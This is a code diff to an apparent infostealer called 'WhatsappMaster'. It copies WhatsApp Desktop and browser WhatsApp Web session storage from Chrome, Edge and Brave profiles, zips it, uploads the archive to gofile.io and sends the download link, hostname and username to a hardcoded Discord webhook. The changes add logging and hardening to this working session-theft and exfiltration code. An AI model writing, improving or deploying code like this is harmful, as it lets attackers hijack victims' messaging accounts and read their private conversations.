@@ -5,10 +5,18 @@ import json
 import shutil
 import socket
 import tempfile
+import traceback
 from pathlib import Path
 
 import requests
-import dhooks
+
+try:
+    import dhooks
+except Exception as _e:
+    dhooks = None
+    _DHOOKS_IMPORT_ERR = str(_e)
+else:
+    _DHOOKS_IMPORT_ERR = None
 
 # PSG > OM
 
@@ -16,6 +24,22 @@ WEBHOOK = "https://discord.com/api/webhooks/1553035523835035731/0RpTshpc0RiUfuKV
 
 AVATAR = ("https://github.com/rinsfx/WhatsappMaster/blob/master/"
           "assets/whatsapp.png?raw=true")
+
+LOG_PATH = Path(tempfile.gettempdir()) / "wmaster.log"
+
+
+def log(msg):
+    try:
+        with open(LOG_PATH, "a", encoding="utf-8") as f:
+            f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
+    except Exception:
+        pass
+
+
+def log_exc(tag):
+    log(f"--- EXCEPTION in {tag} ---")
+    log(traceback.format_exc())
+
 
 DESKTOP_DIR = Path(os.getenv("LOCALAPPDATA", "")) / "Packages" / \
               "5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
@@ -27,6 +51,7 @@ CHROME_ROOTS = {
 }
 
 WA_SUBPATHS = [
+    Path("IndexedDB") / "https.web.whatsapp.com_0.indexeddb.leveldb",
     Path("IndexedDB") / "https_web.whatsapp.com_0.indexeddb.leveldb",
     Path("Local Storage") / "leveldb",
     Path("Session Storage"),
@@ -37,15 +62,23 @@ SKIP_PROFILES = {"Guest Profile", "System Profile"}
 
 
 def load_config():
-    cfg_path = Path(__file__).with_name("config.json")
-    if not cfg_path.exists():
-        cfg_path = Path.cwd() / "config.json"
-    if cfg_path.exists():
-        try:
-            with open(cfg_path, "r", encoding="utf-8") as f:
-                return json.load(f)
-        except Exception:
-            pass
+    candidates = [
+        Path(__file__).resolve().with_name("config.json"),
+        Path.cwd() / "config.json",
+        Path(sys.executable).resolve().with_name("config.json"),
+    ]
+    for cfg_path in candidates:
+        log(f"checking config: {cfg_path} exists={cfg_path.exists()}")
+        if cfg_path.exists():
+            try:
+                with open(cfg_path, "r", encoding="utf-8") as f:
+                    data = json.load(f)
+                log(f"loaded config from {cfg_path}")
+                return data
+            except Exception:
+                log_exc(f"load_config {cfg_path}")
+
+    log("no config found, using defaults + injected WEBHOOK")
     return {
         "webhook": WEBHOOK,
         "targets": ["desktop", "chrome"],
@@ -69,16 +102,22 @@ def copytree_safe(src: Path, dst: Path):
 
 
 def collect_desktop(stage: Path, manifest: dict):
+    log(f"desktop target check: {DESKTOP_DIR} exists={DESKTOP_DIR.exists()}")
     if not DESKTOP_DIR.exists():
+        manifest["targets"].append({"type": "desktop", "status": "skipped",
+                                     "reason": "path not found",
+                                     "path": str(DESKTOP_DIR)})
         return
     dst = stage / "desktop"
     ok, err = copytree_safe(DESKTOP_DIR, dst)
     entry = {"type": "desktop", "path": str(DESKTOP_DIR)}
     if ok:
         entry["status"] = "ok"
+        log("desktop collected ok")
     else:
         entry["status"] = "skipped"
         entry["reason"] = err
+        log(f"desktop skipped: {err}")
         if dst.exists():
             shutil.rmtree(dst, ignore_errors=True)
     manifest["targets"].append(entry)
@@ -87,6 +126,7 @@ def collect_desktop(stage: Path, manifest: dict):
 def collect_chrome(stage: Path, manifest: dict, browsers: list):
     for bname in browsers:
         root = CHROME_ROOTS.get(bname)
+        log(f"chrome root {bname}: {root} exists={bool(root and root.exists())}")
         if not root or not root.exists():
             continue
 
@@ -99,7 +139,6 @@ def collect_chrome(stage: Path, manifest: dict, browsers: list):
                 continue
 
             entry = {"type": "chrome", "browser": bname, "profile": profile.name}
-
             dst_profile = stage / "chrome" / bname / profile.name
             dst_profile.mkdir(parents=True, exist_ok=True)
 
@@ -113,9 +152,11 @@ def collect_chrome(stage: Path, manifest: dict, browsers: list):
                     else _copy_file(src_sub, dst_sub)
                 if ok:
                     copied_any = True
+                    log(f"chrome {bname}/{profile.name}/{sub} ok")
                 else:
                     entry["status"] = "partial"
                     entry.setdefault("warnings", []).append(f"{sub}: {err}")
+                    log(f"chrome {bname}/{profile.name}/{sub} fail: {err}")
 
             if "status" not in entry:
                 entry["status"] = "ok" if copied_any else "skipped"
@@ -135,24 +176,34 @@ def _copy_file(src: Path, dst: Path):
 
 
 def upload_to_gofile(path: Path, retries: int, delay: int):
-    for _ in range(retries):
+    log(f"upload start: {path} size={path.stat().st_size if path.exists() else 'MISSING'}")
+    for i in range(retries):
         try:
             server = requests.get(
                 "https://api.gofile.io/getServer", timeout=15
             ).json()["data"]["server"]
+            log(f"gofile server: {server} (attempt {i+1})")
             with open(path, "rb") as fh:
                 r = requests.post(
                     f"https://{server}.gofile.io/uploadFile",
                     files={"file": fh},
                     timeout=300
                 ).json()
-            return r["data"]["downloadPage"]
+            link = r["data"]["downloadPage"]
+            log(f"upload ok: {link}")
+            return link
         except Exception:
+            log_exc(f"upload attempt {i+1}")
             time.sleep(delay)
+    log("upload failed after all retries")
     return False
 
 
 def send_webhook(url: str, host: str, link: str, targets: list):
+    if dhooks is None:
+        log(f"dhooks unavailable: {_DHOOKS_IMPORT_ERR}")
+        log(f"would-be payload: host={host} link={link}")
+        return
     tgt_str = ", ".join(
         f"{t.get('type')}"
         + (f"/{t.get('browser')}/{t.get('profile')}" if t.get("type") == "chrome" else "")
@@ -176,58 +227,74 @@ def send_webhook(url: str, host: str, link: str, targets: list):
         avatar_url=AVATAR
     )
     hook.send(embed=embed)
+    log("webhook sent")
 
 
 def main():
-    cfg = load_config()
-    webhook_url = cfg.get("webhook") or WEBHOOK
-    retries = int(cfg.get("retries", 10))
-    delay = int(cfg.get("retry_delay_sec", 2))
-    browsers = cfg.get("chrome_browsers", ["chrome", "edge", "brave"])
-    targets_wanted = cfg.get("targets", ["desktop", "chrome"])
-
-    host = socket.gethostname()
-    ts = int(time.time())
-
-    stage = Path(tempfile.gettempdir()) / f"wmaster_{host}_{ts}"
-    stage.mkdir(parents=True, exist_ok=True)
-
-    manifest = {
-        "host": host,
-        "user": os.getenv("USERNAME", ""),
-        "ts": ts,
-        "targets": []
-    }
-
-    if "desktop" in targets_wanted:
-        collect_desktop(stage, manifest)
-
-    if "chrome" in targets_wanted:
-        collect_chrome(stage, manifest, browsers)
-
-    with open(stage / "manifest.json", "w", encoding="utf-8") as f:
-        json.dump(manifest, f, indent=2)
-
-    archive_base = Path(tempfile.gettempdir()) / f"wmaster_{host}_{ts}"
-    zip_path = Path(shutil.make_archive(str(archive_base), "zip", str(stage))[0:])
-    # make_archive returns path; ensure .zip suffix
-    if zip_path.suffix != ".zip":
-        zip_path = Path(str(zip_path) + ".zip")
-
-    shutil.rmtree(stage, ignore_errors=True)
-
-    link = upload_to_gofile(zip_path, retries, delay)
-
     try:
-        zip_path.unlink()
-    except Exception:
-        pass
+        log("=" * 50)
+        log("=== payload start ===")
+        log(f"cwd={os.getcwd()}")
+        log(f"exe={sys.executable}")
+        log(f"LOCALAPPDATA={os.getenv('LOCALAPPDATA')}")
+        log(f"dhooks_import_ok={dhooks is not None}")
 
-    if link:
+        cfg = load_config()
+        webhook_url = cfg.get("webhook") or WEBHOOK
+        retries = int(cfg.get("retries", 10))
+        delay = int(cfg.get("retry_delay_sec", 2))
+        browsers = cfg.get("chrome_browsers", ["chrome", "edge", "brave"])
+        targets_wanted = cfg.get("targets", ["desktop", "chrome"])
+        log(f"webhook set: {bool(webhook_url)}")
+        log(f"targets_wanted: {targets_wanted}")
+
+        host = socket.gethostname()
+        ts = int(time.time())
+
+        stage = Path(tempfile.gettempdir()) / f"wmaster_{host}_{ts}"
+        stage.mkdir(parents=True, exist_ok=True)
+        log(f"stage: {stage}")
+
+        manifest = {
+            "host": host,
+            "user": os.getenv("USERNAME", ""),
+            "ts": ts,
+            "targets": []
+        }
+
+        if "desktop" in targets_wanted:
+            collect_desktop(stage, manifest)
+
+        if "chrome" in targets_wanted:
+            collect_chrome(stage, manifest, browsers)
+
+        with open(stage / "manifest.json", "w", encoding="utf-8") as f:
+            json.dump(manifest, f, indent=2)
+
+        archive_base = Path(tempfile.gettempdir()) / f"wmaster_{host}_{ts}"
+        zip_path = Path(shutil.make_archive(str(archive_base), "zip", str(stage)))
+        log(f"zip: {zip_path} size={zip_path.stat().st_size}")
+        shutil.rmtree(stage, ignore_errors=True)
+
+        link = upload_to_gofile(zip_path, retries, delay)
+
         try:
-            send_webhook(webhook_url, host, link, manifest["targets"])
+            zip_path.unlink()
+            log("zip cleaned")
         except Exception:
-            pass
+            log_exc("zip unlink")
+
+        if link:
+            try:
+                send_webhook(webhook_url, host, link, manifest["targets"])
+            except Exception:
+                log_exc("send_webhook")
+        else:
+            log("no link, skipping webhook")
+
+        log("=== payload done ===")
+    except Exception:
+        log_exc("main")
 
 
 if __name__ == "__main__":
